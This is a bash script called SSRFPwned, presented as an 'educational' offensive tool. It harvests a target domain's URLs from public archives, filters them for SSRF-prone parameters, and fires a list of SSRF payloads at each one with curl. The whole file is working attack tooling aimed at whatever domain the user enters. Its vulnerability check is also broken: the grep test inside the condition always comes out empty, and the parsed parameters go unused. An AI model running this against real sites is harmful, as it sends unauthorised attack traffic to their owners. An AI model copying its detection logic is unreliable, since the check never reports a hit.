#!/bin/bash
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""
# Array of Sun Tzu quotes
# Generate a random Sun Tzu quote for offensive security
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")

random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
sleep 1

echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1

figlet -w 80 -f small SSRFPwned | lolcat
echo ""
echo "[YOUR ARE USING SSRFPwned.sh] - (v1.0a) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1

# Check if the user is connected to the internet
tput bold; echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
if ! wget -q --spider https://google.com; then
  echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING TerminatorZ !" | lolcat
  exit 1
fi

tput bold; echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat

# Prompt user for domain to test
read -p "Enter target domain: " domain

# Create output directory
output_dir="$domain-$(date +%Y%m%d%H%M%S)"
mkdir "$output_dir"

# Fetch URLs from domain using waybackurls
echo "Fetching URLs using Waybackmachine..." | lolcat
waybackurls "$domain" > "$output_dir/waybackurls.txt"
total=$(wc -l < "$output_dir/waybackurls.txt")
echo "Found $total URLs from Waybackmachine" | lolcat
sleep 2

# Fetch URLs from domain using AlienVault
echo "Fetching URLs using AlienVault..." | lolcat
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" |
  jq -r '.passive_dns[].hostname' |
  sed 's/\*\.//g' |
  sort -u > "$output_dir/alien_urls.txt"
total=$(wc -l < "$output_dir/alien_urls.txt")
echo "Found $total URLs from AlientVault" | lolcat
sleep 2

# Fetch URLs from domain using URLScan
echo "Fetching URLs using URLScan..." | lolcat
curl -s "https://urlscan.io/api/v1/search/?q=domain:$domain" |
  jq -r '.results[].page.url' |
  sort -u > "$output_dir/urlscan_urls.txt"
total=$(wc -l < "$output_dir/urlscan_urls.txt")
echo "Found $total URLs from URLScan" | lolcat
sleep 2

# Combine all URLs and filter out irrelevant extensions
echo "Combining all URLs and Filtering out all Irrelevant extensions while cleaning all Parameters..." | lolcat
cat "$output_dir/waybackurls.txt" "$output_dir/alien_urls.txt" "$output_dir/urlscan_urls.txt" |
  grep -E -v '\.(png|jpg|jpeg|gif|pdf|css|js)$' |
  sort -u > "$output_dir/all_urls.txt"
sleep 1

# Test URLs for SSRF
echo "Extracting Alive URls, Filter them with GF for SSRF..." | lolcat
cat "$output_dir/all_urls.txt" |
  httpx --verbose |
  sed 's/=.*/=/' |
  gf ssrf > "$output_dir/final_urls.txt"
total=$(wc -l < "$output_dir/final_urls.txt")
echo "Found $total URLs ideal for SSRF..." | lolcat
sleep 5

# Read payloads from directory
echo "Using Internal SSRF Payloads..." | lolcat
cp ssrfpayloads.txt "$output_dir/"
cat "$output_dir/ssrfpayloads.txt" > "$output_dir/merged_payloads.txt"

# Test URLs for SSRF
echo "Testing URLs for SSRF vulnerabilities..." | lolcat

while IFS= read -r url; do
  # Extract base URL and parameters from URL
  base_url=$(echo "$url" | awk -F'[?]' '{print $1}')
  params=$(echo "$url" | awk -F'[?]' '{print $2}')

  # Loop through each payload and test for SSRF
  while IFS= read -r payload; do
    # Inject payload into each parameter and test URL
    full_url="$url$payload"
    echo -ne "[*] Testing $full_url --> "
    response=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")

    if [[ $response == 200 && $(curl -s "$full_url" | grep -q "$payload") ]]; then
      echo -e "\033[0;32mVulnerable\033[0m"
      echo "$full_url" >> "$output_dir/vulnerable.txt"
    else
      echo -e "\033[0;31mNot vulnerable\033[0m"
    fi
  done < "$output_dir/merged_payloads.txt"
done < "$output_dir/final_urls.txt"

# Count the number of vulnerable URLs found and print the total
total_vulnerable=$(wc -l < "$output_dir/vulnerable.txt")
echo "Found $total_vulnerable vulnerable URLs." | lolcat

# Print a summary of the results
echo "Summary:" | lolcat
echo "--------" | lolcat
echo "Total URLs found: $(wc -l < "$output_dir/all_urls.txt")" | lolcat
echo "Total vulnerable URLs: $total_vulnerable" | lolcat
echo "Output directory: $output_dir" | lolcat

# Clean up temporary files
rm "$output_dir/waybackurls.txt" "$output_dir/alien_urls.txt" "$output_dir/urlscan_urls.txt" "$output_dir/all_urls.txt" "$output_dir/final_urls.txt" "$output_dir/merged_payloads.txt"

# Exit the script
exit 0
